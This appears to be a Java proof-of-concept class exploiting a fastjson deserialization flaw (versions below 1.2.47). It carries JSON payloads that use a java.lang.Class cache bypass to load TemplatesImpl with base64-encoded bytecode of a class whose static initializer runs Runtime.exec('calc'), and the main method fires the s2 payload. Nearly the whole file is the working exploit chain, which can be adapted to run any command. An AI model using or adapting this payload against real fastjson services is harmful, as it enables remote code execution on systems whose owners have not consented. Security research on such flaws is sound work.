package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Base64;

public class fastjsonTest1 {
    public static void main(String[] args) throws Exception{
        byte[] bytes = classBytes();
        String enc = Base64.getEncoder().encodeToString(bytes);
//        System.out.println(enc);
        // fastjson < 1.2.47
        String s = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"}}";
        String s1 = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_name\":\"Mechoy\",\"_tfactory\":{},\"_bytecodes\":[\"yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMQ2F0dGxlOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEAC0NhdHRsZS5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEABkNhdHRsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAADQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHwANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAQAAkAEwAMABEADQASABEAFAANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj\"],\"outputProperties\":{}}}";
        String s2 = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"},\"b\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_name\":\"Mechoy\",\"_tfactory\":{},\"_bytecodes\":[\"yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMQ2F0dGxlOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEAC0NhdHRsZS5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEABkNhdHRsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAADQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHwANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAQAAkAEwAMABEADQASABEAFAANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj\"],\"outputProperties\":{}}}";
//        Object parse = JSON.parseObject(s,Feature.SupportNonPublicField);
//        JSON.parseObject(s1,Feature.SupportNonPublicField);
        JSON.parseObject(s2,Feature.SupportNonPublicField);

    }

    public static byte[] classBytes() throws IOException {
        // 注意路径
        FileInputStream fis = new FileInputStream("C:\\Users\\53433\\Desktop\\class\\Cattle.class");
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }

}
